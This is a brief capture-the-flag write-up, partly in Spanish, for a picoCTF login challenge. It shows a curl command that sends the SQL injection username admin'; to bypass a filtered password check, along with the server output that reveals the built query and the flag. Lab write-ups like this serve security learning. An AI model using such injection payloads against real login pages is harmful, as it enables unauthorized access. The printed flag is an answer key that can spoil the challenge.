## descripcion

There is a website running at `https://jupiter.challenges.picoctf.org/problem/53751/` ([link](https://jupiter.challenges.picoctf.org/problem/53751/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:53751
## pistas 

The password is being filtered.
## Solution

```
ulise@SSJ2 MINGW64 /d/Downloads/notas-hacking (main)
$ curl -s https://jupiter.challenges.picoctf.org/problem/53751/login.php -d "username=admin';&password=password&debug=1"
<pre>username: admin';
password: password
SQL query: SELECT * FROM users WHERE name='admin';' AND password='password'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_c34df170}</p>


```

## notas

Comandos utilizados:
	1.

se utilizo otro tipo de injeccion , el prposito es ver que tipo de sentencia sql verifica y a partir de ahi explotar esta sentencia para que pueda acceder
## references
